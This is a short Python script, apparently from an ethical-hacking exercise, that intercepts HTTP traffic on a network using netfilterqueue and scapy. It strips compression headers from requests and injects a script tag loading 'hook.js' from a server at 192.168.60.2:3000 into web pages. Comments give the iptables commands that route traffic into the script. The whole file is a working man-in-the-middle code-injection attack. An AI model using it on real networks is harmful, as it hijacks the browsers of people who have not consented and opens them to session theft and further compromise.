import netfilterqueue
import scapy.all as scapy
import re 

# it works !
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# sudo python code_injector.py
# clear history or incognito page
# Be Patient it might take a while to load page.
# Try it with http://vulnweb.com/, bing doesn't work due to strict XSS https only rule

#  for a different alternative : # https://thepythoncode.com/article/injecting-code-to-html-in-a-network-scapy-python

def set_load(packet, load):
    packet[scapy.Raw].load = load
    packet[scapy.IP].len = None
    packet[scapy.IP].chksum = None
    packet[scapy.TCP].chksum = None
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            # Request
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            # Response
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = '<script src="http://192.168.60.2:3000/hook.js"></script>'
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search(r"Content-Length:\s*(\d+)\s*(?:\r?\n)?", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass       
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run() 

